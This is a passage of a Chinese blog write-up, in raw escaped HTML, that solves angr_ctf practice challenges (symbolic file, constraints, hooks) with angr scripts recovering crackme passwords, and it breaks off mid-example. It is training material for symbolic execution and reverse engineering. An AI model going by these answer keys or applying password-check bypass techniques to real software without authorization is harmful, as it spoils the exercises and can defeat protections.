simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;find_addr, avoid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;avoid_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    print (simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(), simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;symbolic-file&#34;&gt;symbolic file&lt;/h2&gt;
&lt;p&gt;这题没有用预期做法来做&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OJKSQYDP.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;);
  fread(buffer, &lt;span style=&#34;color:#ae81ff&#34;&gt;1u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40u&lt;/span&gt;, fp);
  fclose(fp);
  unlink(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OJKSQYDP.txt&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;既然这里有个从文件读取，那么可以直接把初始状态设置到文件读取后面，那么这道题就和之前做过的 &lt;code&gt;symbolic memory&lt;/code&gt; 一样了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./07_angr_symbolic_file&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})

init_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804893C&lt;/span&gt;
state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;init_addr)

user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
mem_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A0A0&lt;/span&gt;
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(mem_addr, user_input)

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)

find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80489B0&lt;/span&gt;
avoid_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048996&lt;/span&gt;

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;find_addr, avoid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;avoid_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    print (simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no result&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;constraints&#34;&gt;constraints&lt;/h2&gt;
&lt;p&gt;这题的解法是对运算结果手动做约束，不知道为什么用之前的方法做不出来&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./08_angr_constraints&amp;#39;&lt;/span&gt;, load_options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auto_load_libs&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;}, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})

start_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048625&lt;/span&gt;
start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start_addr)

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
buffer_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A050&lt;/span&gt;

start_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(buffer_addr, flag)

end_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804866E&lt;/span&gt;
simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(start_state)

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; end_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    end_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    calc_res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; end_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(buffer_addr, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
    cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AUPDNNPROEZRJWKB&amp;#34;&lt;/span&gt;
    end_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(calc_res &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; cipher)
    print (end_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(flag, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fail&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;仅模拟了for循环（加密部分），运行结束后直接使用 &lt;code&gt;add_constraints&lt;/code&gt; 手动添加约束条件&lt;/p&gt;
&lt;h2 id=&#34;hook&#34;&gt;hook&lt;/h2&gt;
&lt;p&gt;又来了次非预期&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter the password: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%16s&amp;#34;&lt;/span&gt;, buffer);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;134520916&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; complex_function(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A054&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i);
  equals &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; check_equals_XYMKBKUHNIQYNQXE(buffer, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;j )
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A044&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; complex_function(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;134520900&lt;/span&gt;), j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%16s&amp;#34;&lt;/span&gt;, buffer);
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; equals &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;strncmp(buffer, password, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10u&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然，这道题可以拆成两部分来做，第一部分使用 &lt;code&gt;constraints&lt;/code&gt; 求解第一次输入；第二部分直接获取 password 的运算结果&lt;/p&gt;
&lt;p&gt;于是相当于写了两次 &lt;code&gt;angr&lt;/code&gt;（感觉完全可以合并起来，但稳妥起见，后面再试试）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./09_angr_hooks&amp;#39;&lt;/span&gt;)

start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048665&lt;/span&gt;
user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)

init_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start_state)
buffer_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A054&lt;/span&gt;
init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(buffer_addr, user_input)

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(init_state)

end_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80486AC&lt;/span&gt;
simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; end_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    solution_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(buffer_addr, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
    solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XYMKBKUHNIQYNQXE&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; result)
    print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fail&amp;#34;&lt;/span&gt;)

second_start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80486C0&lt;/span&gt;
second_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; second_start)

second_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A044&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XYMKBKUHNIQYNQXE&amp;#34;&lt;/span&gt;)

second_simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(second_state)

second_simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048700&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; second_simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; second_simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A044&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
    print (second_simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(result, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Enter the password: ZXIDRXEORJOTFFJN
WUFAOUBLOGLQCCGK
Good Job.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;补上用hook写的，用了两种hook的写法（看到simprocedures那题才发现第二个是下一题的写法）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./09_angr_hooks&amp;#39;&lt;/span&gt;)

start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()

check_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80486B3&lt;/span&gt;
instraction_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;

choose_hook &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; choose_hook &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
	&lt;span style=&#34;color:#a6e22e&#34;&gt;@proj&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook(check_addr, length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; instraction_len)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_check_equal&lt;/span&gt;(state):
		target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;XYMKBKUHNIQYNQXE&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# claripy will convert it to bytes if it is str.&lt;/span&gt;
		input_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A054&lt;/span&gt;
		cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(input_addr, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;)
		state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;If(cipher &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; target, claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVV(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;), claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVV(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; choose_hook &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
	&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_check_equal&lt;/span&gt;(SimProcedure):
		&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
			target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;XYMKBKUHNIQYNQXE&amp;#39;&lt;/span&gt;
			input_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804A054&lt;/span&gt;
